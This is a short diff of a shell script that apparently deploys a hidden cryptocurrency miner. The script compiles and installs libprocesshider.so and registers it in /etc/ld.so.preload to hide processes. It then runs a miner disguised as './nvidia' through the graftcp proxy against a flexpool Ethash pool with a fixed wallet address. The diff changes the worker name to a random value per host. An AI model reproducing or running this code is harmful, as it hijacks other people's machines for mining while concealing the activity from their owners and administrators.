@@ -45,4 +45,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./nvidia -a ETHASH --pool eth-us-west.flexpool.io:5555 --tls on --user 0x3cedcf1be712024f205c428c3ba997d8b0e9d3c8 --worker nvi --longstats 5 --shortstats 5 --timeprint on --log on --ethstratum ETHPROXY --basecolor
+./graftcp/graftcp ./nvidia -a ETHASH --pool eth-us-west.flexpool.io:5555 --tls on --user 0x3cedcf1be712024f205c428c3ba997d8b0e9d3c8 --worker $(echo $(shuf -i 1-99999 -n 1)-BIN) --longstats 5 --shortstats 5 --timeprint on --log on --ethstratum ETHPROXY --basecolor
